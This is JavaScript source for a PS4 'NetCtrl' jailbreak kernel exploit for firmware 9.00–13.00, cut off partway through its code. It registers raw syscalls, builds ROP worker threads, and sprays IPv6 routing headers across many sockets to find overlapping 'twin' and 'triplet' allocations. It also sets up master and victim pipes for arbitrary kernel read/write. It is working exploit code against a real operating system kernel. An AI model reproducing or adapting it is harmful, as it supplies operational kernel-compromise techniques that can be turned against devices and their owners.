// include('userland.js')

if (typeof libc_addr === 'undefined') {
  include('userland.js');
}
include('kernel.js');
include('stats-tracker.js');
include('binloader.js');
if (!String.prototype.padStart) {
  String.prototype.padStart = function padStart(targetLength, padString) {
    targetLength = targetLength >> 0; // truncate if number or convert non-number to 0
    padString = String(typeof padString !== 'undefined' ? padString : ' ');
    if (this.length > targetLength) {
      return String(this);
    } else {
      targetLength = targetLength - this.length;
      if (targetLength > padString.length) {
        padString += padString.repeat(targetLength / padString.length); // append to original to ensure we are longer than needed
      }
      return padString.slice(0, targetLength) + String(this);
    }
  };
}
fn.register(0x29, 'dup', ['bigint'], 'bigint');
var dup = fn.dup;
fn.register(0x06, 'close', ['bigint'], 'bigint');
var close = fn.close;
fn.register(0x03, 'read', ['bigint', 'bigint', 'number'], 'bigint');
var read = fn.read;
fn.register(0x04, 'write', ['bigint', 'bigint', 'number'], 'bigint');
var write = fn.write;
fn.register(0x36, 'ioctl', ['bigint', 'number', 'bigint'], 'bigint');
var ioctl = fn.ioctl;
fn.register(0x2A, 'pipe', ['bigint'], 'bigint');
var pipe = fn.pipe;
fn.register(0x16A, 'kqueue', [], 'bigint');
var kqueue = fn.kqueue;
fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint');
var socket = fn.socket;
fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint');
var socketpair = fn.socketpair;
fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint');
var getsockopt = fn.getsockopt;
fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint');
var setsockopt = fn.setsockopt;
fn.register(0x17, 'setuid', ['number'], 'bigint');
var setuid = fn.setuid;
fn.register(20, 'getpid', [], 'bigint');
var getpid = fn.getpid;
fn.register(0x14B, 'sched_yield', [], 'bigint');
var sched_yield = fn.sched_yield;
fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
var cpuset_getaffinity = fn.cpuset_getaffinity;
fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
var cpuset_setaffinity = fn.cpuset_setaffinity;
fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint');
var rtprio_thread = fn.rtprio_thread;
fn.register(0x63, 'netcontrol', ['bigint', 'number', 'bigint', 'number'], 'bigint');
var netcontrol = fn.netcontrol;
fn.register(0x1C7, 'thr_new', ['bigint', 'number'], 'bigint');
var thr_new = fn.thr_new;
fn.register(0x1B1, 'thr_kill', ['bigint', 'number'], 'bigint');
var thr_kill = fn.thr_kill;
fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint');
var nanosleep = fn.nanosleep;
fn.register(0x5C, 'fcntl', ['bigint', 'number', 'number'], 'bigint');
var fcntl = fn.fcntl;

// Extract syscall wrapper addresses for ROP chains from syscalls.map
var read_wrapper = syscalls.map.get(0x03);
var write_wrapper = syscalls.map.get(0x04);
var sched_yield_wrapper = syscalls.map.get(0x14b);
var cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8);
var rtprio_thread_wrapper = syscalls.map.get(0x1D2);
var recvmsg_wrapper = syscalls.map.get(0x1B);
var readv_wrapper = syscalls.map.get(0x78);
var writev_wrapper = syscalls.map.get(0x79);
var thr_exit_wrapper = syscalls.map.get(0x1af);
var thr_suspend_ucontext_wrapper = syscalls.map.get(0x278);
var setsockopt_wrapper = syscalls.map.get(0x69);
var getsockopt_wrapper = syscalls.map.get(0x76);
fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint');
var setjmp = fn.setjmp;
var setjmp_addr = libc_addr.add(0x6CA00);
var longjmp_addr = libc_addr.add(0x6CA50);
var BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF);
var KERNEL_PID = 0;
var SYSCORE_AUTHID = new BigInt(0x48000000, 0x00000007);
var FIOSETOWN = 0x8004667C;
var PAGE_SIZE = 0x4000;
var NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
var NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;
var AF_UNIX = 1;
var AF_INET6 = 28;
var SOCK_STREAM = 1;
var IPPROTO_IPV6 = 41;
var SO_SNDBUF = 0x1001;
var SOL_SOCKET = 0xffff;
var IPV6_RTHDR = 51;
var IPV6_RTHDR_TYPE_0 = 0;
var RTP_PRIO_REALTIME = 2;
var UIO_READ = 0;
var UIO_WRITE = 1;
var UIO_SYSSPACE = 1;
var CPU_LEVEL_WHICH = 3;
var CPU_WHICH_TID = 1;
var IOV_SIZE = 0x10;
var CPU_SET_SIZE = 0x10;
var PIPEBUF_SIZE = 0x18;
var MSG_HDR_SIZE = 0x30;
var FILEDESCENT_SIZE = 0x8;
var UCRED_SIZE = 0x168;
var RTHDR_TAG = 0x13370000;
var UIO_IOV_NUM = 0x14;
var MSG_IOV_NUM = 0x17;

// Params for kext stability
var IPV6_SOCK_NUM = 96;
var IOV_THREAD_NUM = 8;
var UIO_THREAD_NUM = 8;
var MAIN_LOOP_ITERATIONS = 3;
var TRIPLEFREE_ITERATIONS = 8;
var KQUEUE_ITERATIONS = 5000;
var MAX_ROUNDS_TWIN = 5;
var MAX_ROUNDS_TRIPLET = 200;
var MAIN_CORE = 4;
var MAIN_RTPRIO = 0x100;
var RTP_LOOKUP = 0;
var RTP_SET = 1;
var PRI_REALTIME = 2;
var F_SETFL = 4;
var O_NONBLOCK = 4;
var FW_VERSION = null; // Needs to be initialized to patch kernel

/***************************/
/*      Used constiables     */
/** *********************** */

var twins = new Array(2);
var triplets = new Array(3);
var ipv6_socks = new Array(IPV6_SOCK_NUM);
var spray_rthdr = malloc(UCRED_SIZE);
var spray_rthdr_len = -1;
var leak_rthdr = malloc(UCRED_SIZE);

// Allocate buffer for ipv6_sockets magic spray
var spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);
// Allocate buffer array for all socket data (X sockets × 8 bytes each)
var read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8);
var check_len = malloc(4);
// Initialize check_len to 8 bytes (done in JavaScript before ROP runs)

var fdt_ofiles = new BigInt(0);
var master_r_pipe_file = new BigInt(0);
var victim_r_pipe_file = new BigInt(0);
var master_r_pipe_data = new BigInt(0);
var victim_r_pipe_data = new BigInt(0);

// Corrupt pipebuf of masterRpipeFd.
var master_pipe_buf = malloc(PIPEBUF_SIZE);
write32(check_len, 8);
var msg = malloc(MSG_HDR_SIZE);
var msgIov = malloc(MSG_IOV_NUM * IOV_SIZE);
var uioIovRead = malloc(UIO_IOV_NUM * IOV_SIZE);
var uioIovWrite = malloc(UIO_IOV_NUM * IOV_SIZE);
var uio_sock = malloc(8);
var iov_sock = malloc(8);
var iov_thread_ready = malloc(8 * IOV_THREAD_NUM);
var iov_thread_done = malloc(8 * IOV_THREAD_NUM);
var iov_signal_buf = malloc(8 * IOV_THREAD_NUM);
var uio_readv_thread_ready = malloc(8 * UIO_THREAD_NUM);
var uio_readv_thread_done = malloc(8 * UIO_THREAD_NUM);
var uio_readv_signal_buf = malloc(8 * IOV_THREAD_NUM);
var uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM);
var uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM);
var uio_writev_signal_buf = malloc(8 * IOV_THREAD_NUM);
var spray_ipv6_ready = malloc(8);
var spray_ipv6_done = malloc(8);
var spray_ipv6_signal_buf = malloc(8);
var spray_ipv6_stack = malloc(0x2000);
var iov_recvmsg_workers = [];
var uio_readv_workers = [];
var uio_writev_workers = [];
var spray_ipv6_worker;
var uaf_socket;
var uio_sock_0;
var uio_sock_1;
var iov_sock_0;
var iov_sock_1;
var pipe_sock = malloc(8);
var master_pipe = [0, 0];
var victim_pipe = [0, 0];
var masterRpipeFd;
var masterWpipeFd;
var victimRpipeFd;
var victimWpipeFd;
var kq_fdp;
var kl_lock;
var tmp = malloc(PAGE_SIZE);
var saved_fpu_ctrl = 0;
var saved_mxcsr = 0;
function build_rthdr(buf, size) {
  var len = (size >> 3) - 1 & ~1;
  var actual_size = len + 1 << 3;
  write8(buf.add(0x00), 0); // ip6r_nxt
  write8(buf.add(0x01), len); // ip6r_len
  write8(buf.add(0x02), IPV6_RTHDR_TYPE_0); // ip6r_type
  write8(buf.add(0x03), len >> 1); // ip6r_segleft
  return actual_size;
}
function set_sockopt(sd, level, optname, optval, optlen) {
  var result = setsockopt(sd, level, optname, optval, optlen);
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('set_sockopt error: ' + hex(result));
  }
  return result;
}

// Global buffer to minimize footprint
var sockopt_len_ptr = malloc(4);
var nanosleep_timespec = malloc(0x10);
var cpu_mask_buf = malloc(0x10);
var rtprio_scratch = malloc(0x4);
var sockopt_val_buf = malloc(4);
var nc_set_buf = malloc(8);
var nc_clear_buf = malloc(8);
var spawn_thr_args = malloc(0x80);
var spawn_tid = malloc(0x8);
var spawn_cpid = malloc(0x8);
function get_sockopt(sd, level, optname, optval, optlen) {
  // const len_ptr = malloc(4);
  write32(sockopt_len_ptr, optlen);
  var result = getsockopt(sd, level, optname, optval, sockopt_len_ptr);
  // debug("get_sockopt with sd: " + hex(sd) + " result: " + hex(result));
  if (result.eq(BigInt_Error)) {
    throw new Error('get_sockopt error: ' + hex(result));
    // debug("get_sockopt error: " + hex(result));
  }
  return read32(sockopt_len_ptr);
}
function set_rthdr(sd, buf, len) {
  return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
  // debug("set_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
  // debug("Called with buf: " + hex(read64(buf)) + " len: " + hex(len));
  // return ret;
}
function get_rthdr(sd, buf, max_len) {
  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
  // debug("get_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
  // debug("Result buf: " + hex(read64(buf)) + " max_len: " + hex(max_len));
  // return ret;
}
function free_rthdrs(sds) {
  for (var sd of sds) {
    if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
      set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
    }
  }
}
function free_rthdr(sd) {
  set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
}
function pin_to_core(core) {
  write32(cpu_mask_buf, 1 << core);
  cpuset_setaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf);
}
function get_core_index(mask_addr) {
  var num = Number(read32(mask_addr));
  var position = 0;
  while (num > 0) {
    num = num >>> 1;
    position++;
  }
  return position - 1;
}
function get_current_core() {
  cpuset_getaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf);
  return get_core_index(cpu_mask_buf);
}
function set_rtprio(prio) {
  write16(rtprio_scratch, PRI_REALTIME);
  write16(rtprio_scratch.add(2), prio);
  rtprio_thread(RTP_SET, 0, rtprio_scratch);
}
function get_rtprio() {
  write16(rtprio_scratch, PRI_REALTIME);
  write16(rtprio_scratch.add(2), 0);
  rtprio_thread(RTP_LOOKUP, 0, rtprio_scratch);
  return Number(read16(rtprio_scratch.add(2)));
}
function create_workers() {
  var sock_buf = malloc(8);

  // Create workers
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    var _ready = iov_thread_ready.add(8 * i);
    var _done = iov_thread_done.add(8 * i);
    var _signal_buf = iov_signal_buf.add(8 * i);

    // Socket pair to signal "run"
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    var _pipe_ = read32(sock_buf);
    var _pipe_2 = read32(sock_buf.add(4));
    // debug("create pipe: " + pipe_0 + " " + pipe_1);

    var _ret = iov_recvmsg_worker_rop(_ready, new BigInt(_pipe_), _done, _signal_buf);
    var _worker = {
      rop: _ret.rop,
      loop_size: _ret.loop_size,
      pipe_0: _pipe_,
      pipe_1: _pipe_2,
      ready: _ready,
      done: _done,
      signal_buf: _signal_buf
    };
    iov_recvmsg_workers[i] = _worker;
  }
  for (var _i = 0; _i < UIO_THREAD_NUM; _i++) {
    var _ready2 = uio_readv_thread_ready.add(8 * _i);
    var _done2 = uio_readv_thread_done.add(8 * _i);
    var _signal_buf2 = uio_readv_signal_buf.add(8 * _i);

    // Socket pair to signal "run"
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    var _pipe_3 = read32(sock_buf);
    var _pipe_4 = read32(sock_buf.add(4));
    // debug("create pipe: " + pipe_0 + " " + pipe_1);

    var _ret2 = uio_readv_worker_rop(_ready2, new BigInt(_pipe_3), _done2, _signal_buf2);
    var _worker2 = {
      rop: _ret2.rop,
      loop_size: _ret2.loop_size,
      pipe_0: _pipe_3,
      pipe_1: _pipe_4,
      ready: _ready2,
      done: _done2,
      signal_buf: _signal_buf2
    };
    uio_readv_workers[_i] = _worker2;
  }
  for (var _i2 = 0; _i2 < UIO_THREAD_NUM; _i2++) {
    var _ready3 = uio_writev_thread_ready.add(8 * _i2);
    var _done3 = uio_writev_thread_done.add(8 * _i2);
    var _signal_buf3 = uio_writev_signal_buf.add(8 * _i2);

    // Socket pair to signal "run"
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    var _pipe_5 = read32(sock_buf);
    var _pipe_6 = read32(sock_buf.add(4));
    // debug("create pipe: " + pipe_0 + " " + pipe_1);

    var _ret3 = uio_writev_worker_rop(_ready3, new BigInt(_pipe_5), _done3, _signal_buf3);
    var _worker3 = {
      rop: _ret3.rop,
      loop_size: _ret3.loop_size,
      pipe_0: _pipe_5,
      pipe_1: _pipe_6,
      ready: _ready3,
      done: _done3,
      signal_buf: _signal_buf3
    };
    uio_writev_workers[_i2] = _worker3;
  }

  // Create worker for spray and read magic in ipv6_sockets
  var ready = spray_ipv6_ready;
  var done = spray_ipv6_done;
  var signal_buf = spray_ipv6_signal_buf;

  // Socket pair to signal "run"
  socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
  var pipe_0 = read32(sock_buf);
  var pipe_1 = read32(sock_buf.add(4));
  var ret = ipv6_sock_spray_and_read_rop(ready, new BigInt(pipe_0), done, signal_buf);
  var worker = {
    rop: ret.rop,
    loop_size: ret.loop_size,
    pipe_0,
    pipe_1,
    ready,
    done,
    signal_buf
  };
  spray_ipv6_worker = worker; // --> Worker data
}
function init_workers() {
  init_threading(); // save needed info for longjmp

  var worker;
  var ret;
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    worker = iov_recvmsg_workers[i];
    ret = spawn_thread(worker.rop, worker.loop_size);
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn iov_recvmsg_workers[' + i + ']');
    }
    var thread_id = Number(ret.and(0xFFFFFFFF)); // Convert to 32bits value
    worker.thread_id = thread_id; // Save thread ID
  }
  for (var _i3 = 0; _i3 < UIO_THREAD_NUM; _i3++) {
    worker = uio_readv_workers[_i3];
    ret = spawn_thread(worker.rop, worker.loop_size);
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn uio_readv_workers[' + _i3 + ']');
    }
    var _thread_id = Number(ret.and(0xFFFFFFFF)); // Convert to 32bits value
    worker.thread_id = _thread_id; // Save thread ID
  }
  for (var _i4 = 0; _i4 < UIO_THREAD_NUM; _i4++) {
    worker = uio_writev_workers[_i4];
    ret = spawn_thread(worker.rop, worker.loop_size);
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn uio_writev_workers[' + _i4 + ']');
    }
    var _thread_id2 = Number(ret.and(0xFFFFFFFF)); // Convert to 32bits value
    worker.thread_id = _thread_id2; // Save thread ID
  }
}
function nanosleep_fun(nsec) {
  write64(nanosleep_timespec, Math.floor(nsec / 1e9)); // tv_sec
  write64(nanosleep_timespec.add(8), nsec % 1e9); // tv_nsec
  nanosleep(nanosleep_timespec);
}
function wait_for(addr, threshold) {
  while (!read64(addr).eq(threshold)) {
    nanosleep_fun(1);
  }
}
function trigger_iov_recvmsg() {
  var worker;
  // Clear done signals
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    worker = iov_recvmsg_workers[i];
    write64(worker.done, 0);
    // debug("Worker done: " + hex(read64(worker.done)) );
  }

  // Send Init signal
  for (var _i5 = 0; _i5 < IOV_THREAD_NUM; _i5++) {
    worker = iov_recvmsg_workers[_i5];
    var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
    if (ret.eq(BigInt_Error)) {
      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + _i5 + ']');
    }
  }
}
function wait_iov_recvmsg() {
  var worker;
  // Wait for completition
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    worker = iov_recvmsg_workers[i];
    wait_for(worker.done, 1);
    // debug("Worker done: " + hex(read64(worker.done)) );
  }

  // debug("iov_recvmsg workers run OK");
}
function trigger_ipv6_spray_and_read() {
  // Worker information is already loaded

  // Clear done signals
  write64(spray_ipv6_worker.done, 0);

  // Spawn ipv6_sockets spray and read worker
  // Passing an stack addr reserved for each iteration
  var ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack);
  if (ret.eq(BigInt_Error)) {
    throw new Error('Could not spray_ipv6_worker');
  }
  var thread_id = Number(ret.and(0xFFFFFFFF)); // Convert to 32bits value
  spray_ipv6_worker.thread_id = thread_id; // Save thread ID

  // Send Init signal
  ret = write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
  if (ret.eq(BigInt_Error)) {
    throw new Error("Could not signal 'run' spray_ipv6_worker");
  }
}
function wait_ipv6_spray_and_read() {
  // Wait for completition
  wait_for(spray_ipv6_worker.done, 1);
}
function trigger_uio_readv() {
  var worker;
  // Clear done signals
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_readv_workers[i];
    write64(worker.done, 0);
    // debug("trigger_uio_readv done: " + hex(read64(worker.done)) );
  }

  // Send Init signal
  for (var _i6 = 0; _i6 < UIO_THREAD_NUM; _i6++) {
    worker = uio_readv_workers[_i6];
    var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
    if (ret.eq(BigInt_Error)) {
      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + _i6 + ']');
    }
  }
}
function wait_uio_readv() {
  var worker;
  // Wait for completition
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_readv_workers[i];
    wait_for(worker.done, 1);
  }
  // debug("Exit wait_uio_readv()");
}
function trigger_uio_writev() {
  var worker;
  // Clear done signals
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_writev_workers[i];
    write64(worker.done, 0);
    // debug("trigger_uio_writev done: " + hex(read64(worker.done)) );
  }

  // Send Init signal
  for (var _i7 = 0; _i7 < UIO_THREAD_NUM; _i7++) {
    worker = uio_writev_workers[_i7];
    var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
    if (ret.eq(BigInt_Error)) {
      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + _i7 + ']');
    }
  }
}
function wait_uio_writev() {
  var worker;
  // Wait for completition
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_writev_workers[i];
    wait_for(worker.done, 1);
  }
  // debug("Exit wait_uio_writev()");
}
function init() {
  log('=== PS4 NetCtrl Jailbreak ===');
  log('build: 1d6e4fb250b8d7996263a77397f4a72abf0def99');
  FW_VERSION = get_fwversion();
  log('Detected PS4 firmware: ' + FW_VERSION);
  if (FW_VERSION === null) {
    log('Failed to detect PS4 firmware version.\nAborting...');
    send_notification('Failed to detect PS4 firmware version.\nAborting...');
    return false;
  }
  var compare_version = (a, b) => {
    var a_arr = a.split('.');
    var amaj = Number(a_arr[0]);
    var amin = Number(a_arr[1]);
    var b_arr = b.split('.');
    var bmaj = Number(b_arr[0]);
    var bmin = Number(b_arr[1]);
    return amaj === bmaj ? amin - bmin : amaj - bmaj;
  };
  if (compare_version(FW_VERSION, '9.00') < 0 || compare_version(FW_VERSION, '13.00') > 0) {
    log('Unsupported PS4 firmware\nSupported: 9.00-13.00\nAborting...');
    send_notification('Unsupported PS4 firmware\nAborting...');
    return false;
  }
  kernel_offset = get_kernel_offset(FW_VERSION);
  log('Kernel offsets loaded for FW ' + FW_VERSION);
  return true;
}
var prev_core = -1;
var prev_rtprio = -1;
var cleanup_called = false;
function setup() {
  debug('Preparing netctrl...');
  prev_core = get_current_core();
  prev_rtprio = get_rtprio();
  pin_to_core(MAIN_CORE);
  set_rtprio(MAIN_RTPRIO);
  debug('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE);

  // Prepare spray buffer.
  spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
  // debug("this is spray_rthdr_len: " + hex(spray_rthdr_len));

  // Fill spray_rthdr_rop for ipv6_sockets spray
  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
    build_rthdr(spray_rthdr_rop.add(i * UCRED_SIZE), UCRED_SIZE);
    // Prefill with tagged information
    write32(spray_rthdr_rop.add(i * UCRED_SIZE + 0x04), RTHDR_TAG | i);
  }

  // Prepare msg iov buffer.
  write64(msg.add(0x10), msgIov); // msg_iov
  write64(msg.add(0x18), MSG_IOV_NUM); // msg_iovlen

  var dummyBuffer = malloc(0x1000);
  fill_buffer_64(dummyBuffer, new BigInt(0x41414141, 0x41414141), 0x1000);
  write64(uioIovRead.add(0x00), dummyBuffer);
  write64(uioIovWrite.add(0x00), dummyBuffer);

  // Create socket pair for uio spraying.
  socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock);
  uio_sock_0 = read32(uio_sock);
  uio_sock_1 = read32(uio_sock.add(4));

  // Create socket pair for iov spraying.
  socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock);
  iov_sock_0 = read32(iov_sock);
  iov_sock_1 = read32(iov_sock.add(4));

  // Set up sockets for spraying.
  for (var _i8 = 0; _i8 < ipv6_socks.length; _i8++) {
    ipv6_socks[_i8] = socket(AF_INET6, SOCK_STREAM, 0);
  }

  // Initialize pktopts.
  free_rthdrs(ipv6_socks);

  // Create pipes for arbitrary kernel r/w
  pipe(pipe_sock);
  master_pipe[0] = read32(pipe_sock);
  master_pipe[1] = read32(pipe_sock.add(4));
  pipe(pipe_sock);
  victim_pipe[0] = read32(pipe_sock);
  victim_pipe[1] = read32(pipe_sock.add(4));
  masterRpipeFd = master_pipe[0];
  masterWpipeFd = master_pipe[1];
  victimRpipeFd = victim_pipe[0];
  victimWpipeFd = victim_pipe[1];
  fcntl(new BigInt(masterRpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(masterWpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(victimRpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK);

  // Create and Init Thread Workers
  create_workers();
  init_workers();
  debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']');
}
function cleanup() {
  var kill_workers = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : false;
  if (cleanup_called) return;
  cleanup_called = true;
  debug('Cleaning up...');

  // Close ipv6 sockets first (not blocking)
  for (var i = 0; i < ipv6_socks.length; i++) {
    close(ipv6_socks[i]);
  }

  // Signal workers to unblock from read(), then kill them
  // Workers loop: read(pipe) -> work -> done -> repeat
  // We write to unblock, then kill before they loop back

  for (var _i9 = 0; _i9 < IOV_THREAD_NUM; _i9++) {
    var worker = iov_recvmsg_workers[_i9];
    if (worker !== undefined) {
      // Write to unblock from read()
      write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
      if (kill_workers && worker.thread_id !== undefined) {
        thr_kill(worker.thread_id, 9); // SIGKILL
      }
    }
  }
  for (var _i0 = 0; _i0 < UIO_THREAD_NUM; _i0++) {
    var _worker4 = uio_readv_workers[_i0];
    if (_worker4 !== undefined) {
      write(new BigInt(_worker4.pipe_1), _worker4.signal_buf, 1);
      if (kill_workers && _worker4.thread_id !== undefined) {
        thr_kill(_worker4.thread_id, 9); // SIGKILL
      }
    }
  }
  for (var _i1 = 0; _i1 < UIO_THREAD_NUM; _i1++) {
    var _worker5 = uio_writev_workers[_i1];
    if (_worker5 !== undefined) {
      write(new BigInt(_worker5.pipe_1), _worker5.signal_buf, 1);
      if (kill_workers && _worker5.thread_id !== undefined) {
        thr_kill(_worker5.thread_id, 9); // SIGKILL
      }
    }
  }
  if (spray_ipv6_worker !== undefined) {
    write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
    if (kill_workers && spray_ipv6_worker.thread_id !== undefined) {
      thr_kill(spray_ipv6_worker.thread_id, 9); // SIGKILL
    }
  }

  // Now close the main sockets (workers are dead or unblocked)
  close(new BigInt(uio_sock_1));
  close(new BigInt(uio_sock_0));
  close(new BigInt(iov_sock_1));
  close(new BigInt(iov_sock_0));

  // Skip uaf_socket - hangs
  // if (uaf_socket !== undefined) {
  //   close(new BigInt(uaf_socket))
  // }

  if (prev_core >= 0) {
    debug('Restoring to previous core: ' + prev_core);
    pin_to_core(prev_core);
    prev_core = -1;
  }
  set_rtprio(prev_rtprio);
  debug('Cleanup completed');
}
function fill_buffer_64(buf, val, len) {
  for (var i = 0; i < len; i = i + 8) {
    write64(buf.add(i), val);
  }
}
function find_twins() {
  var count = 0;
  var val;
  var i;
  var j;
  var zeroMemoryCount = 0;

  // Minimizing the usage of BigInt class
  var spray_add = spray_rthdr.add(0x04);
  var lead_add = leak_rthdr.add(0x04);
  while (count < MAX_ROUNDS_TWIN) {
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount++;
      if (zeroMemoryCount >= 5) {
        log('netctrl failed!');
        cleanup();
        return false;
      }
    } else {
      zeroMemoryCount = 0;
    }
    if (count % 10 === 0) {
      // debug("find_twins iteration: " + count);
    }
    for (i = 0; i < ipv6_socks.length; i++) {
      write32(spray_add, RTHDR_TAG | i);
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);

      // Using pre-filled buffer to spray
      // set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
      // setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
    }
    for (i = 0; i < ipv6_socks.length; i++) {
      get_rthdr(ipv6_socks[i], leak_rthdr, 8);
      val = read32(lead_add);
      j = val & 0xFFFF;
      // I got 'i' socket routing header but find 'j' value
      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
        twins[0] = i;
        twins[1] = j;
        log('Twins found: [' + i + '] [' + j + ']');
        return true;
      }
    }
    count++;
  }
  log('find_twins failed');
  return false;
  // cleanup();
  // throw new Error("find_twins failed");
}
function find_triplet(master, other, iterations) {
  // debug("Enter find_triplet (" + master + ") (" + other + ")" );

  if (typeof iterations === 'undefined') {
    iterations = MAX_ROUNDS_TRIPLET;
  }
  var count = 0;
  var val;
  var i;
  var j;

  // Minimizing the usage of BigInt class
  var spray_add = spray_rthdr.add(0x04);
  var leak_add = leak_rthdr.add(0x04);
  while (count < iterations) {
    if (count % 100 === 0) {
      // debug("find_triplet iteration: " + count);
    }
    for (i = 0; i < ipv6_socks.length; i++) {
      if (i === master || i === other) {
        continue;
      }
      write32(spray_add, RTHDR_TAG | i);
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);

      // Using pre-filled buffer to spray
      // set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
      // setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
    }

    // for (i = 0; i < ipv6_socks.length; i++) {
    //    if (i === master || i === other) {
    //        continue;
    //    }
    get_rthdr(ipv6_socks[master], leak_rthdr, 8);
    val = read32(leak_add);
    j = val & 0xFFFF;
    if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
      // debug("Triplet found: [" + j + "] at iteration " + count);
      return j;
    }
    // }
    count++;
  }
  return -1;
  // cleanup();
  // throw new Error("find_triplet failed");
}
function init_threading() {
  var jmpbuf = malloc(0x60);
  setjmp(jmpbuf);
  saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
  saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
}
var LOG_MAX_LINES = 38;
var LOG_COLORS = ['#FF6B6B', '#FFA94D', '#FFD93D', '#6BCF7F', '#4DABF7', '#9775FA', '#DA77F2'];
function setup_log_screen() {
  jsmaf.root.children.length = 0;
  var bg = new Image({
    url: 'file:///../download0/img/multiview_bg_VAF.png',
    x: 0,
    y: 0,
    width: 1920,
    height: 1080
  });
  jsmaf.root.children.push(bg);
  for (var i = 0; i < LOG_COLORS.length; i++) {
    new Style({
      name: 'log' + i,
      color: LOG_COLORS[i],
      size: 20
    });
  }
  var logLines = [];
  var logBuf = [];
  for (var _i10 = 0; _i10 < LOG_MAX_LINES; _i10++) {
    var line = new jsmaf.Text();
    line.text = '';
    line.style = 'log' + _i10 % LOG_COLORS.length;
    line.x = 20;
    line.y = 120 + _i10 * 20;
    jsmaf.root.children.push(line);
    logLines.push(line);
  }
  _log = function (msg, screen) {
    if (screen) {
      logBuf.push(msg);
      if (logBuf.length > LOG_MAX_LINES) logBuf.shift();
      for (var _i11 = 0; _i11 < LOG_MAX_LINES; _i11++) {
        logLines[_i11].text = _i11 < logBuf.length ? logBuf[_i11] : '';
      }
    }
    ws.broadcast(msg);
  };
}
function yield_to_render(callback) {
  var id = jsmaf.setInterval(function () {
